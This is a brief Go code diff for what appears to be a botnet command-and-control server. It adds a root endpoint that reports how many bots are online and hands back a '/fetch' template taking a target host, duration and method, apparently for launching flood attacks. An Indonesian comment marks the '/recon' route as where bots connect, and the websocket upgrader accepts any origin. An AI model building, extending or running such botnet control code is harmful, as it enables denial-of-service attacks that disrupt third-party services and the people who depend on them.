@@ -68,6 +68,22 @@ var upgrader = websocket.Upgrader{
 	CheckOrigin: func(r *http.Request) bool { return true },
 }
 
+// / — info endpoint + fetch template
+func indexHandler(hub *Hub) http.HandlerFunc {
+	return func(w http.ResponseWriter, r *http.Request) {
+		if r.URL.Path != "/" {
+			http.NotFound(w, r)
+			return
+		}
+		host := r.Host
+		w.Header().Set("Content-Type", "application/json")
+		json.NewEncoder(w).Encode(map[string]interface{}{
+			"bots_online": hub.count(),
+			"fetch":       fmt.Sprintf("http://%s/fetch?host=&duration=&method=", host),
+		})
+	}
+}
+
 // /recon — bot menyambung ke sini
 func reconHandler(hub *Hub) http.HandlerFunc {
 	return func(w http.ResponseWriter, r *http.Request) {
@@ -135,6 +151,7 @@ func main() {
 
 	hub := newHub()
 
+	http.HandleFunc("/", indexHandler(hub))
 	http.HandleFunc("/recon", reconHandler(hub))
 	http.HandleFunc("/fetch", fetchHandler(hub))
 
